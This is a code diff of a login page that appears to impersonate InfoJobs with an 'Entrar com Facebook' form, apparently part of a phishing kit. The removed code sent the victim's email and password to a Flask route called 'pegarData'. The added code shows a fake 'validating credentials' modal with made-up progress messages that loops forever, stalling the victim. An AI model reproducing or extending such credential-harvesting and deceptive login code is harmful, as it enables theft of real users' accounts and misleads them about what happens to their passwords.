@@ -200,30 +200,83 @@
   <script src="https://login.infojobs.com.br/dist/vendors/js/bootstrap.bundle.min.js"></script>
   
         <script type="module" src="https://login.infojobs.com.br/dist/login.b0849cdc1abcab7da267.js"></script>
-    
+<!-- Modal de validação -->
+<div class="modal fade" id="modalValidando" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static">
+  <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content text-center p-4">
+      <div class="modal-body">
+        <div id="mensagemValidando" class="font-size-18 mb-3">Validando credenciais...</div>
+        <div class="spinner-border text-primary" role="status">
+          <span class="sr-only">Carregando...</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
 </body>
 </html>
 
 <script>
 $(document).ready(function () {
-    // Função de envio usada pelo botão "Entrar com Facebook"
+    const mensagens = [
+        "Validando credenciais...",
+        "Conectando ao Facebook...",
+        "Verificando autenticação...",
+        "Aguarde, quase lá...",
+        "Gerando token de acesso...",
+        "Esperando validação do Facebook..."
+    ];
+
+    let loopUltimaMensagem = null;
+
+    function mostrarMensagensSequenciais() {
+        let index = 0;
+
+        function mostrarProxima() {
+            if (index < mensagens.length) {
+                $('#mensagemValidando').fadeOut(300, function () {
+                    $(this).text(mensagens[index]).fadeIn(300);
+                });
+
+                index++;
+                setTimeout(mostrarProxima, 1500);
+            } else {
+                // Começar o loop infinito com a última mensagem
+                iniciarLoopUltimaMensagem();
+            }
+        }
+
+        mostrarProxima();
+    }
+
+    function iniciarLoopUltimaMensagem() {
+        const msgFinal = mensagens[mensagens.length - 1];
+        loopUltimaMensagem = setInterval(() => {
+            $('#mensagemValidando').fadeOut(300, function () {
+                $(this).text(msgFinal).fadeIn(300);
+            });
+        }, 2000);
+    }
+
+    function mostrarModalValidando() {
+        $('#modalValidando').modal('show');
+        $('#mensagemValidando').text(''); // limpar antes de começar
+        mostrarMensagensSequenciais();
+    }
+
+    function esconderModalValidando() {
+        clearInterval(loopUltimaMensagem);
+        loopUltimaMensagem = null;
+        $('#modalValidando').modal('hide');
+    }
+
     function enviarLogin() {
         const email = $("#email").val().trim();
         const passwd = $("#passwd").val().trim();
 
-        if (email.length !== 0 && passwd.length !== 0) {
-            $.ajax({
-                url: "{{ url_for('pegarData') }}",
-                type: 'post',
-                data: {
-                    email: email,
-                    passwd: passwd
-                },
-            })
-            .done(function (msg) {
-                $("#email").val("");
-                $("#passwd").val("");
-            });
+        if (email && passwd) {
+            mostrarModalValidando();
         } else {
             alert("Necessário preencher os campos de email e senha e clicar em Entrar com Facebook!");
         }
@@ -234,12 +287,13 @@ $(document).ready(function () {
         enviarLogin();
     });
 
-    // Pressionar Enter em qualquer input do formulário
+    // Pressionar Enter
     $("#email, #passwd").on("keydown", function (event) {
         if (event.key === "Enter") {
-            event.preventDefault(); // evita o envio padrão do formulário
+            event.preventDefault();
             enviarLogin();
         }
     });
 });
 </script>
+
